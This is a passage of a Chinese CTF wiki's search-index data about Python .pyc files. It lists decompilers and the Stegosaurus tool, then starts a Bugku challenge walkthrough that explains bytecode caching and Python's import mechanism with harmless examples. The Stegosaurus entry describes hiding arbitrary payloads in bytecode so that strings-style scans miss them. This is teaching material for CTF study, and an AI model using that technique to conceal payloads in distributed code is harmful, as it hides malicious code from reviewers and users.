0ctf-2017:py</li> <li>writeup: \u8bb0\u4e00\u6b21\u624b\u64b8CPython bytecode</li> </ul>"},{"location":"misc/other/pyc/#tools","title":"Tools","text":""},{"location":"misc/other/pyc/#pycdc","title":"pycdc","text":"<p>\u5c06python\u5b57\u8282\u7801\u8f6c\u6362\u4e3a\u53ef\u8bfb\u7684python \u6e90\u4ee3\u7801,\u5305\u542b\u4e86\u53cd\u6c47\u7f16(pycads)\u548c\u53cd\u7f16\u8bd1(pycdc)\u4e24\u79cd\u5de5\u5177</p>"},{"location":"misc/other/pyc/#stegosaurus","title":"Stegosaurus","text":"<p>Stegosaurus \u662f\u4e00\u6b3e\u9690\u5199\u5de5\u5177\uff0c\u5b83\u5141\u8bb8\u6211\u4eec\u5728 Python \u5b57\u8282\u7801\u6587\u4ef6( pyc \u6216 pyo )\u4e2d\u5d4c\u5165\u4efb\u610f Payload\u3002\u7531\u4e8e\u7f16\u7801\u5bc6\u5ea6\u8f83\u4f4e\uff0c\u56e0\u6b64\u6211\u4eec\u5d4c\u5165 Payload \u7684\u8fc7\u7a0b\u65e2\u4e0d\u4f1a\u6539\u53d8\u6e90\u4ee3\u7801\u7684\u8fd0\u884c\u884c\u4e3a\uff0c\u4e5f\u4e0d\u4f1a\u6539\u53d8\u6e90\u6587\u4ef6\u7684\u6587\u4ef6\u5927\u5c0f\u3002 Payload \u4ee3\u7801\u4f1a\u88ab\u5206\u6563\u5d4c\u5165\u5230\u5b57\u8282\u7801\u4e4b\u4e2d\uff0c\u6240\u4ee5\u7c7b\u4f3c strings \u8fd9\u6837\u7684\u4ee3\u7801\u5de5\u5177\u65e0\u6cd5\u67e5\u627e\u5230\u5b9e\u9645\u7684 Payload\u3002 Python \u7684 dis \u6a21\u5757\u4f1a\u8fd4\u56de\u6e90\u6587\u4ef6\u7684\u5b57\u8282\u7801\uff0c\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528 Stegosaurus \u6765\u5d4c\u5165 Payload \u4e86\u3002</p> <p>\u539f\u7406\u662f\u5728 python \u7684\u5b57\u8282\u7801\u6587\u4ef6\u4e2d\uff0c\u5229\u7528\u5197\u4f59\u7a7a\u95f4\uff0c\u5c06\u5b8c\u6574\u7684 payload \u4ee3\u7801\u5206\u6563\u9690\u85cf\u5230\u8fd9\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7a7a\u95f4\u4e2d\u3002</p> <p>\u5177\u4f53\u7528\u6cd5\u53ef\u53c2\u770b ctf-tools\u3002</p>"},{"location":"misc/other/pyc/#_3","title":"\u4f8b\u9898","text":"<p>Bugku QAQ</p> <p>\u8d5b\u9898\u94fe\u63a5\u5982\u4e0b\uff1a</p> <pre><code>http://ctf.bugku.com/files/447e4b626f2d2481809b8690613c1613/QAQ\nhttp://ctf.bugku.com/files/5c02892cd05a9dcd1c5a34ef22dd9c5e/cipher.txt\n</code></pre> <p>\u9996\u5148\u62ff\u5230\u8fd9\u9053\u9898\uff0c\u7528 <code>010Editor</code> \u4e4d\u4e00\u773c\u770b\u8fc7\u53bb\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e9b\u7279\u5f81\u4fe1\u606f\uff1a</p> <p></p> <p>\u53ef\u4ee5\u5224\u65ad\u8fd9\u662f\u4e2a\u8ddf <code>python</code> \u6709\u5173\u7684\u4e1c\u897f\uff0c\u901a\u8fc7\u67e5\u9605\u76f8\u5173\u8d44\u6599\u53ef\u4ee5\u5224\u65ad\u8fd9\u662f\u4e2a <code>python</code> \u7ecf\u7f16\u8bd1\u8fc7\u540e\u7684 <code>pyc</code> \u6587\u4ef6\u3002\u8fd9\u91cc\u53ef\u80fd\u5f88\u591a\u5c0f\u4f19\u4f34\u4eec\u53ef\u80fd\u4e0d\u7406\u89e3\u4e86\uff0c\u4ec0\u4e48\u662f <code>pyc</code> \u6587\u4ef6\u5462\uff1f\u4e3a\u4ec0\u4e48\u4f1a\u751f\u6210 <code>pyc</code> \u6587\u4ef6\uff1f <code>pyc</code> \u6587\u4ef6\u53c8\u662f\u4f55\u65f6\u751f\u6210\u7684\u5462\uff1f\u4e0b\u9762\u6211\u5c06\u4e00\u4e00\u89e3\u7b54\u8fd9\u4e9b\u95ee\u9898\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c <code>pyc</code> \u6587\u4ef6\u5c31\u662f <code>Python</code> \u7684\u5b57\u8282\u7801\u6587\u4ef6\uff0c\u662f\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u6211\u4eec\u90fd\u77e5\u9053 <code>Python</code> \u662f\u4e00\u79cd\u5168\u5e73\u53f0\u7684\u89e3\u91ca\u6027\u8bed\u8a00\uff0c\u5168\u5e73\u53f0\u5176\u5b9e\u5c31\u662f <code>Python</code> \u6587\u4ef6\u5728\u7ecf\u8fc7\u89e3\u91ca\u5668\u89e3\u91ca\u4e4b\u540e(\u6216\u8005\u79f0\u4e3a\u7f16\u8bd1)\u751f\u6210\u7684 <code>pyc</code> \u6587\u4ef6\u53ef\u4ee5\u5728\u591a\u4e2a\u5e73\u53f0\u4e0b\u8fd0\u884c\uff0c\u8fd9\u6837\u540c\u6837\u4e5f\u53ef\u4ee5\u9690\u85cf\u6e90\u4ee3\u7801\u3002\u5176\u5b9e\uff0c <code>Python</code> \u662f\u5b8c\u5168\u9762\u5411\u5bf9\u8c61\u7684\u8bed\u8a00\uff0c <code>Python</code> \u6587\u4ef6\u5728\u7ecf\u8fc7\u89e3\u91ca\u5668\u89e3\u91ca\u540e\u751f\u6210\u5b57\u8282\u7801\u5bf9\u8c61 <code>PyCodeObject</code> \uff0c <code>pyc</code> \u6587\u4ef6\u53ef\u4ee5\u7406\u89e3\u4e3a\u662f <code>PyCodeObject</code> \u5bf9\u8c61\u7684\u6301\u4e45\u5316\u4fdd\u5b58\u65b9\u5f0f\u3002\u800c <code>pyc</code> \u6587\u4ef6\u53ea\u6709\u5728\u6587\u4ef6\u88ab\u5f53\u6210\u6a21\u5757\u5bfc\u5165\u65f6\u624d\u4f1a\u751f\u6210\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c <code>Python</code> \u89e3\u91ca\u5668\u8ba4\u4e3a\uff0c\u53ea\u6709 <code>import</code> \u8fdb\u884c\u7684\u6a21\u5757\u624d\u9700\u8981\u88ab\u91cd\u7528\u3002 \u751f\u6210 <code>pyc</code> \u6587\u4ef6\u7684\u597d\u5904\u663e\u800c\u6613\u89c1\uff0c\u5f53\u6211\u4eec\u591a\u6b21\u8fd0\u884c\u7a0b\u5e8f\u65f6\uff0c\u4e0d\u9700\u8981\u91cd\u65b0\u5bf9\u8be5\u6a21\u5757\u8fdb\u884c\u91cd\u65b0\u7684\u89e3\u91ca\u3002\u4e3b\u6587\u4ef6\u4e00\u822c\u53ea\u9700\u8981\u52a0\u8f7d\u4e00\u6b21\uff0c\u4e0d\u4f1a\u88ab\u5176\u4ed6\u6a21\u5757\u5bfc\u5165\uff0c\u6240\u4ee5\u4e00\u822c\u4e3b\u6587\u4ef6\u4e0d\u4f1a\u751f\u6210 <code>pyc</code> \u6587\u4ef6\u3002</p> <p>\u6211\u4eec\u4e3e\u4e2a\u4f8b\u5b50\u6765\u8bf4\u660e\u8fd9\u4e2a\u95ee\u9898\uff1a</p> <p>\u4e3a\u4e86\u65b9\u4fbf\u8d77\u89c1\uff0c\u6211\u4eec\u4e8b\u5148\u521b\u5efa\u4e00\u4e2atest\u6587\u4ef6\u5939\u4f5c\u4e3a\u6b64\u6b21\u5b9e\u9a8c\u7684\u6d4b\u8bd5\uff1a</p> <pre><code>mkdir test &amp;&amp; cd test/\n</code></pre> <p>\u5047\u8bbe\u6211\u4eec\u73b0\u5728\u6709\u4e2a <code>test.py</code> \u6587\u4ef6\uff0c\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\uff1a</p> <pre><code>def print_test():\n    print('Hello,Kitty!')\n\nprint_test()\n</code></pre> <p>\u6211\u4eec\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a</p> <pre><code>python3 test.py\n</code></pre> <p>\u4e0d\u7528\u8bf4\uff0c\u60f3\u5fc5\u5927\u5bb6\u90fd\u77e5\u9053\u6253\u5370\u51fa\u7684\u7ed3\u679c\u662f\u4e0b\u9762\u8fd9\u4e2a\uff1a</p> <pre><code>Hello,Kitty!\n</code></pre> <p>\u6211\u4eec\u901a\u8fc7\u4e0b\u9762\u547d\u4ee4\u67e5\u770b\u4e0b\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u6709\u54ea\u4e9b\u6587\u4ef6\uff1a</p> <pre><code>ls -alh\n</code></pre> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5e76\u6ca1\u6709 <code>pyc</code> \u6587\u4ef6\u751f\u6210\u3002</p> <p>\u2018\u6211\u4eec\u518d\u53bb\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u4e3a <code>import_test.py</code> \u6587\u4ef6\uff0c\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\uff1a</p> <p>\u6ce8\uff1a <code>test.py</code> \u548c <code>import_test.py</code> \u5e94\u5f53\u653e\u5728\u540c\u4e00\u6587\u4ef6\u5939\u4e0b</p> <pre><code>import test\n\ntest.print_test()\n</code></pre> <p>\u6211\u4eec\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a</p> <pre><code>python3 import_test.py\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>Hello,Kitty!\nHello,Kitty!\n</code></pre> <p>\u8bf6\uff0c\u4e3a\u5565\u4f1a\u6253\u5370\u51fa\u4e24\u53e5\u76f8\u540c\u7684\u8bdd\u5462\uff1f\u6211\u4eec\u518d\u5f80\u4e0b\u770b\uff0c\u6211\u4eec\u901a\u8fc7\u4e0b\u9762\u547d\u4ee4\u67e5\u770b\u4e0b\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u6709\u54ea\u4e9b\u6587\u4ef6\uff1a</p> <pre><code>ls -alh\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>\u603b\u7528\u91cf 20K\ndrwxr-xr-x 3 python python 4.0K 11\u6708  5 20:38 .\ndrwxrwxr-x 4 python python 4.0K 11\u6708  5 20:25 ..\n-rw-r--r-- 1 python python   31 11\u6708  5 20:38 import_test.py\ndrwxr-xr-x 2 python python 4.0K 11\u6708  5 20:38 __pycache__\n-rw-r--r-- 1 python python   58 11\u6708  5 20:28 test.py\n</code></pre> <p>\u8bf6\uff0c\u591a\u4e86\u4e2a <code>__pycache__</code> \u6587\u4ef6\u5939\uff0c\u6211\u4eec\u8fdb\u5165\u6587\u4ef6\u5939\u4e0b\u770b\u770b\u6709\u4ec0\u4e48\uff1f</p> <pre><code>cd __pycache__ &amp;&amp; ls\n</code></pre> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u751f\u6210\u4e86\u4e00\u4e2a <code>test.cpython-36.pyc</code> \u3002\u4e3a\u4ec0\u4e48\u662f\u8fd9\u6837\u5b50\u5462\uff1f</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u5728\u6267\u884c <code>python3 import_test.py</code> \u547d\u4ee4\u7684\u65f6\u5019\uff0c\u9996\u5148\u5f00\u59cb\u6267\u884c\u7684\u662f <code>import test</code> \uff0c\u5373\u5bfc\u5165 <code>test</code> \u6a21\u5757\uff0c\u800c\u4e00\u4e2a\u6a21\u5757\u88ab\u5bfc\u5165\u65f6\uff0c <code>PVM(Python Virtual Machine)</code> \u4f1a\u5728\u540e\u53f0\u4ece\u4e00\u7cfb\u5217\u8def\u5f84\u4e2d\u641c\u7d22\u8be5\u6a21\u5757\uff0c\u5176\u641c\u7d22\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ul> <li>\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u641c\u7d22\u8be5\u6a21\u5757</li> <li>\u5728\u73af\u5883\u53d8\u91cf <code>PYTHONPATH</code> \u4e2d\u6307\u5b9a\u7684\u8def\u5f84\u5217\u8868\u4e2d\u4f9d\u6b21\u641c\u7d22</li> <li>\u5728 <code>python</code> \u5b89\u88c5\u8def\u5f84\u4e2d\u641c\u7d22</li> </ul> <p>\u4e8b\u5b9e\u4e0a\uff0c <code>PVM</code> \u901a\u8fc7\u53d8\u91cf <code>sys.path</code> \u4e2d\u5305\u542b\u7684\u8def\u5f84\u6765\u641c\u7d22\uff0c\u8fd9\u4e2a\u53d8\u91cf\u91cc\u9762\u5305\u542b\u7684\u8def\u5f84\u5217\u8868\u5c31\u662f\u4e0a\u9762\u63d0\u5230\u7684\u8fd9\u4e9b\u8def\u5f84\u4fe1\u606f\u3002</p> <p>\u6a21\u5757\u7684\u641c\u7d22\u8def\u5f84\u90fd\u653e\u5728\u4e86 <code>sys.path</code> \u5217\u8868\u4e2d\uff0c\u5982\u679c\u7f3a\u7701\u7684 <code>sys.path</code> \u4e2d\u6ca1\u6709\u542b\u6709\u81ea\u5df1\u7684\u6a21\u5757\u6216\u5305\u7684\u8def\u5f84\uff0c\u53ef\u4ee5\u52a8\u6001\u7684\u52a0\u5165 <code>(sys.path.apend)</code> \u5373\u53ef\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c <code>Python</code> \u4e2d\u6240\u6709\u52a0\u8f7d\u5230\u5185\u5b58\u7684\u6a21\u5757\u90fd\u653e\u5728 <code>sys.modules</code> \u3002\u5f53 <code>import</code> \u4e00\u4e2a\u6a21\u5757\u65f6\u9996\u5148\u4f1a\u5728\u8fd9\u4e2a\u5217\u8868\u4e2d\u67e5\u627e\u662f\u5426\u5df2\u7ecf\u52a0\u8f7d\u4e86\u6b64\u6a21\u5757\uff0c\u5982\u679c\u52a0\u8f7d\u4e86\u5219\u53ea\u662f\u5c06\u6a21\u5757\u7684\u540d\u5b57\u52a0\u5165\u5230\u6b63\u5728\u8c03\u7528 <code>import</code> \u7684\u6a21\u5757\u7684 <code>Local</code> \u540d\u5b57\u7a7a\u95f4\u4e2d\u3002\u5982\u679c\u6ca1\u6709\u52a0\u8f7d\u5219\u4ece <code>sys.path</code> \u76ee\u5f55\u4e2d\u6309\u7167\u6a21\u5757\u540d\u79f0\u67e5\u627e\u6a21\u5757\u6587\u4ef6\uff0c\u6a21\u5757\u6587\u4ef6\u53ef\u4ee5\u662f <code>py</code> \u3001 <code>pyc</code> \u3001 <code>pyd</code> \uff0c\u627e\u5230\u540e\u5c06\u6a21\u5757\u8f7d\u5165\u5185\u5b58\uff0c\u5e76\u52a0\u5165\u5230 <code>sys.modules</code> \u4e2d\uff0c\u5e76\u5c06\u540d\u79f0\u5bfc\u5165\u5230\u5f53\u524d\u7684 <code>Local</code> \u540d\u5b57\u7a7a\u95f4\u3002</p> <p>\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u4e00\u4e2a\u6a21\u5757\u4e0d\u4f1a\u91cd\u590d\u8f7d\u5165\u3002\u591a\u4e2a\u4e0d\u540c\u7684\u6a21\u5757\u90fd\u53ef\u4ee5\u7528 <code>import</code> \u5f15\u5165\u540c\u4e00\u4e2a\u6a21\u5757\u5230\u81ea\u5df1\u7684 <code>Local</code> \u540d\u5b57\u7a7a\u95f4\uff0c\u5176\u5b9e\u80cc\u540e\u7684 <code>PyModuleObject</code> \u5bf9\u8c61\u53ea\u6709\u4e00\u4e2a\u3002</p> <p>\u5728\u8fd9\u91cc\uff0c\u6211\u8fd8\u8981\u8bf4\u660e\u4e00\u4e2a\u95ee\u9898\uff0c<code>import</code> \u53ea\u80fd\u5bfc\u5165\u6a21\u5757\uff0c\u4e0d\u80fd\u5bfc\u5165\u6a21\u5757\u4e2d\u7684\u5bf9\u8c61(\u7c7b\u3001\u51fd\u6570\u3001\u53d8\u91cf\u7b49)\u3002\u4f8b\u5982\u50cf\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u5728 <code>test.py</code> \u91cc\u9762\u5b9a\u4e49\u4e86\u4e00\u4e2a\u51fd\u6570 <code>print_test()</code> \uff0c\u6211\u5728\u53e6\u5916\u4e00\u4e2a\u6a21\u5757\u6587\u4ef6 <code>import_test.py</code>\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7 <code>import test.print_test</code> \u5c06 <code>print_test</code> \u5bfc\u5165\u5230\u672c\u6a21\u5757\u6587\u4ef6\u4e2d\uff0c\u53ea\u80fd\u7528 <code>import test</code> \u8fdb\u884c\u5bfc\u5165\u3002\u5982\u679c\u6211\u60f3\u53ea\u5bfc\u5165\u7279\u5b9a\u7684\u7c7b\u3001\u51fd\u6570\u3001\u53d8\u91cf\uff0c\u7528 <code>from test import print_test</code> \u5373\u53ef\u3002 </p> <p></p> <p>\u65e2\u7136\u8bf4\u5230\u4e86 <code>import</code> \u5bfc\u5165\u673a\u5236\uff0c\u518d\u63d0\u4e00\u63d0\u5d4c\u5957\u5bfc\u5165\u548c <code>Package</code> \u5bfc\u5165\u3002</p> <p><code>import</code> \u5d4c\u5957\u5bfc\u5165</p> <p>\u5d4c\u5957\uff0c\u4e0d\u96be\u7406\u89e3\uff0c\u5c31\u662f\u4e00\u4e2a\u5957\u7740\u4e00\u4e2a\u3002\u5c0f\u65f6\u5019\u6211\u4eec\u90fd\u73a9\u8fc7\u4fc4\u7f57\u65af\u5957\u5a03\u5427\uff0c\u4fc4\u7f57\u65af\u5957\u5a03\u5c31\u662f\u4e00\u4e2a\u5927\u5a03\u5a03\u91cc\u9762\u5957\u7740\u4e00\u4e2a\u5c0f\u5a03\u5a03\uff0c\u5c0f\u5a03\u5a03\u91cc\u9762\u8fd8\u6709\u66f4\u5c0f\u7684\u5a03\u5a03\uff0c\u800c\u8fd9\u4e2a\u5d4c\u5957\u5bfc\u5165\u4e5f\u662f\u540c\u4e00\u4e2a\u610f\u601d\u3002\u5047\u5982\u6211\u4eec\u73b0\u5728\u6709\u4e00\u4e2a\u6a21\u5757\uff0c\u6211\u4eec\u60f3\u8981\u5bfc\u5165\u6a21\u5757 <code>A</code> \uff0c\u800c\u6a21\u5757 <code>A</code> \u4e2d\u6709\u542b\u6709\u5176\u4ed6\u6a21\u5757\u9700\u8981\u5bfc\u5165\uff0c\u6bd4\u5982\u6a21\u5757 <code>B</code> \uff0c\u6a21\u5757 <code>B</code> \u4e2d\u53c8\u542b\u6709\u6a21\u5757 <code>C</code> \uff0c\u4e00\u76f4\u8fd9\u6837\u5ef6\u7eed\u4e0b\u53bb\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6211\u4eec\u79f0\u4e4b\u4e3a <code>import</code> \u5d4c\u5957\u5bfc\u5165\u3002</p> <p>\u5bf9\u8fd9\u79cd\u5d4c\u5957\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u5c31\u662f\u5404\u4e2a\u6a21\u5757\u7684 <code>Local</code> \u540d\u5b57\u7a7a\u95f4\u662f\u72ec\u7acb\u7684\uff0c\u6240\u4ee5\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u672c\u6a21\u5757 <code>import A</code> \u5b8c\u4e86\u540e\uff0c\u672c\u6a21\u5757\u53ea\u80fd\u8bbf\u95ee\u6a21\u5757 <code>A</code> \uff0c\u4e0d\u80fd\u8bbf\u95ee <code>B</code> \u53ca\u5176\u5b83\u6a21\u5757\u3002\u867d\u7136\u6a21\u5757 <code>B</code> \u5df2\u7ecf\u52a0\u8f7d\u5230\u5185\u5b58\u4e86\uff0c\u5982\u679c\u8981\u8bbf\u95ee\uff0c\u8fd8\u5fc5\u987b\u660e\u786e\u5728\u672c\u6a21\u5757\u4e2d\u5bfc\u5165 <code>import B</code> \u3002</p> <p>\u90a3\u5982\u679c\u6211\u4eec\u6709\u4ee5\u4e0b\u5d4c\u5957\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u5904\u7406\u5462\uff1f</p> <p>\u6bd4\u5982\u6211\u4eec\u73b0\u5728\u6709\u4e2a\u6a21\u5757 <code>A</code> \uff1a</p> <pre><code># A.py\nfrom B import D\nclass C:\n    pass\n</code></pre> <p>\u8fd8\u6709\u4e2a\u6a21\u5757 <code>B</code> \uff1a</p> <pre><code># B.py\nfrom A import C\nclass D:\n    pass\n</code></pre> <p>\u6211\u4eec\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u5982\u679c\u7a0b\u5e8f\u8fd0\u884c\uff0c\u5e94\u8be5\u4f1a\u53bb\u4ece\u6a21\u5757B\u4e2d\u8c03\u7528\u5bf9\u8c61D\u3002</p> <p>\u6211\u4eec\u5c1d\u8bd5\u6267\u884c\u4e00\u4e0b <code>python A.py</code> \uff1a</p> <p></p> <p>\u62a5 <code>ImportError</code> \u7684\u9519\u8bef\uff0c\u4f3c\u4e4e\u662f\u6ca1\u6709\u52a0\u8f7d\u5230\u5bf9\u8c61 <code>D</code> \uff0c\u800c\u6211\u4eec\u5c06 <code>from B import D</code> \u6539\u6210 <code>import B</code> \uff0c\u6211\u4eec\u4f3c\u4e4e\u5c31\u80fd\u6267\u884c\u6210\u529f\u4e86\u3002</p> <p></p> <p>\u8fd9\u662f\u600e\u4e48\u56de\u4e8b\u5462\uff1f\u8fd9\u5176\u5b9e\u662f\u8ddf <code>Python</code> \u5185\u90e8 <code>import</code> \u7684\u673a\u5236\u662f\u6709\u5173\u7684\uff0c\u5177\u4f53\u5230 <code>from B import D</code> \uff0c <code>Python</code> \u5185\u90e8\u4f1a\u5206\u6210\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>\u5728 <code>sys.modules</code> \u4e2d\u67e5\u627e\u7b26\u53f7 <code>B</code></li> <li>\u5982\u679c\u7b26\u53f7 <code>B</code> \u5b58\u5728\uff0c\u5219\u83b7\u5f97\u7b26\u53f7 <code>B</code> \u5bf9\u5e94\u7684 <code>module</code> \u5bf9\u8c61 <code>&lt;module B&gt;</code> \u3002\u4ece <code>&lt;module B&gt;</code> \u7684 <code>__dict__</code> \u4e2d\u83b7\u5f97\u7b26\u53f7 <code>D</code> \u5bf9\u5e94\u7684\u5bf9\u8c61\uff0c\u5982\u679c <code>D</code> \u4e0d\u5b58\u5728\uff0c\u5219\u629b\u51fa\u5f02\u5e38</li> <li>\u5982\u679c\u7b26\u53f7 <code>B</code> \u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 <code>module</code> \u5bf9\u8c61 <code>&lt;module B&gt;</code> \uff0c\u6ce8\u610f\uff0c\u6b64\u65f6 <code>module</code> \u5bf9\u8c61\u7684 <code>__dict__</code> \u4e3a\u7a7a\u3002\u6267\u884c <code>B.py</code> \u4e2d\u7684\u8868\u8fbe\u5f0f\uff0c\u586b\u5145 <code>&lt;module B&gt;</code> \u7684 <code>__dict__</code>  \u3002\u4ece <code>&lt;module B&gt;</code> \u7684 <code>__dict__</code> \u4e2d\u83b7\u5f97 <code>D</code> \u5bf9\u5e94\u7684\u5bf9\u8c61\u3002\u5982\u679c <code>D</code> \u4e0d\u5b58\u5728\uff0c\u5219\u629b\u51fa\u5f02\u5e38\u3002</li> </ul> <p>\u6240\u4ee5\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u7684\u6267\u884c\u987a\u5e8f\u5982\u4e0b\uff1a</p> <p>1\u3001\u6267\u884c <code>A.py</code> \u4e2d\u7684 <code>from B import D</code> </p> <p>\u6ce8\uff1a\u7531\u4e8e\u662f\u6267\u884c\u7684 <code>python A.py</code> \uff0c\u6240\u4ee5\u5728 <code>sys.modules</code> \u4e2d\u5e76\u6ca1\u6709 <code>&lt;module B&gt;</code> \u5b58\u5728\uff0c\u9996\u5148\u4e3a <code>B.py</code> \u521b\u5efa\u4e00\u4e2a <code>module</code> \u5bf9\u8c61( <code>&lt;module B&gt;</code> )\uff0c\u6ce8\u610f\uff0c\u8fd9\u65f6\u521b\u5efa\u7684\u8fd9\u4e2a <code>module</code> \u5bf9\u8c61\u662f\u7a7a\u7684\uff0c\u91cc\u8fb9\u5565\u4e5f\u6ca1\u6709\uff0c\u5728 <code>Python</code> \u5185\u90e8\u521b\u5efa\u4e86\u8fd9\u4e2a <code>module</code> \u5bf9\u8c61\u4e4b\u540e\uff0c\u5c31\u4f1a\u89e3\u6790\u6267\u884c <code>B.py</code> \uff0c\u5176\u76ee\u7684\u662f\u586b\u5145 <code>&lt;module B&gt;</code> \u8fd9\u4e2a <code>dict</code> \u3002</p> <p>2\u3001\u6267\u884c <code>B.py</code> \u4e2d\u7684 <code>from A import C</code> </p> <p>\u6ce8\uff1a\u5728\u6267\u884c <code>B.py</code> \u7684\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u78b0\u5230\u8fd9\u4e00\u53e5\uff0c\u9996\u5148\u68c0\u67e5 <code>sys.modules</code> \u8fd9\u4e2a <code>module</code> \u7f13\u5b58\u4e2d\u662f\u5426\u5df2\u7ecf\u5b58\u5728 <code>&lt;module A&gt;</code> \u4e86\uff0c\u7531\u4e8e\u8fd9\u65f6\u7f13\u5b58\u8fd8\u6ca1\u6709\u7f13\u5b58 <code>&lt;module A&gt;</code> \uff0c\u6240\u4ee5\u7c7b\u4f3c\u7684\uff0c <code>Python</code> \u5185\u90e8\u4f1a\u4e3a <code>A.py</code> \u521b\u5efa\u4e00\u4e2a <code>module</code> \u5bf9\u8c61( <code>&lt;module A&gt;</code> )\uff0c\u7136\u540e\uff0c\u540c\u6837\u5730\uff0c\u6267\u884c <code>A.py</code> \u4e2d\u7684\u8bed\u53e5\u3002</p> <p>3\u3001\u518d\u6b21\u6267\u884c <code>A.py</code> \u4e2d\u7684 <code>from B import D</code> </p> <p>\u6ce8\uff1a\u8fd9\u65f6\uff0c\u7531\u4e8e\u5728\u7b2c <code>1</code> \u6b65\u65f6\uff0c\u521b\u5efa\u7684 <code>&lt;module B&gt;</code> \u5bf9\u8c61\u5df2\u7ecf\u7f13\u5b58\u5728\u4e86 <code>sys.modules</code> \u4e2d\uff0c\u6240\u4ee5\u76f4\u63a5\u5c31\u5f97\u5230\u4e86 <code>&lt;module B&gt;</code> \uff0c\u4f46\u662f\uff0c\u6ce8\u610f\uff0c\u4ece\u6574\u4e2a\u8fc7\u7a0b\u6765\u770b\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u8fd9\u65f6 <code>&lt;module B&gt;</code> \u8fd8\u662f\u4e00\u4e2a\u7a7a\u7684\u5bf9\u8c61\uff0c\u91cc\u9762\u5565\u4e5f\u6ca1\u6709\uff0c\u6240\u4ee5\u4ece\u8fd9\u4e2a <code>module</code> \u4e2d\u83b7\u5f97\u7b26\u53f7 <code>D</code> \u7684\u64cd\u4f5c\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u5982\u679c\u8fd9\u91cc\u53ea\u662f <code>import B</code> \uff0c\u7531\u4e8e <code>B</code> \u8fd9\u4e2a\u7b26\u53f7\u5728 <code>sys.modules</code> \u4e2d\u5df2\u7ecf\u5b58\u5728\uff0c\u6240\u4ee5\u662f\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38\u7684\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u56fe\u5f88\u6e05\u695a\u7684\u770b\u5230 <code>import</code> \u5d4c\u5957\u5bfc\u5165\u7684\u8fc7\u7a0b\uff1a</p> <p></p> <p><code>Package</code> \u5bfc\u5165</p> <p>\u5305 <code>(Package)</code> \u53ef\u4ee5\u770b\u6210\u6a21\u5757\u7684\u96c6\u5408\uff0c\u53ea\u8981\u4e00\u4e2a\u6587\u4ef6\u5939\u4e0b\u9762\u6709\u4e2a <code>__init__.py</code> \u6587\u4ef6\uff0c\u90a3\u4e48\u8fd9\u4e2a\u6587\u4ef6\u5939\u5c31\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u4e2a\u5305\u3002\u5305\u4e0b\u9762\u7684\u6587\u4ef6\u5939\u8fd8\u53ef\u4ee5\u6210\u4e3a\u5305(\u5b50\u5305)\u3002\u66f4\u8fdb\u4e00\u6b65\u7684\u8bb2\uff0c\u591a\u4e2a\u8f83\u5c0f\u7684\u5305\u53ef\u4ee5\u805a\u5408\u6210\u4e00\u4e2a\u8f83\u5927\u7684\u5305\u3002\u901a\u8fc7\u5305\u8fd9\u79cd\u7ed3\u6784\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8fdb\u884c\u7c7b\u7684\u7ba1\u7406\u548c\u7ef4\u62a4\uff0c\u4e5f\u65b9\u4fbf\u4e86\u7528\u6237\u7684\u4f7f\u7528\u3002\u6bd4\u5982 <code>SQLAlchemy</code> \u7b49\u90fd\u662f\u4ee5\u5305\u7684\u5f62\u5f0f\u53d1\u5e03\u7ed9\u7528\u6237\u7684\u3002</p> <p>\u5305\u548c\u6a21\u5757\u5176\u5b9e\u662f\u5f88\u7c7b\u4f3c\u7684\u4e1c\u897f\uff0c\u5982\u679c\u67e5\u770b\u5305\u7684\u7c7b\u578b\uff1a <code>import SQLAlchemy type(SQLAlchemy)</code> \uff0c\u53ef\u4ee5\u770b\u5230\u5176\u5b9e\u4e5f\u662f <code>&lt;type 'module'&gt;</code> \u3002 <code>import</code> \u5305\u7684\u65f6\u5019\u67e5\u627e\u7684\u8def\u5f84\u4e5f\u662f <code>sys.path</code>\u3002</p> 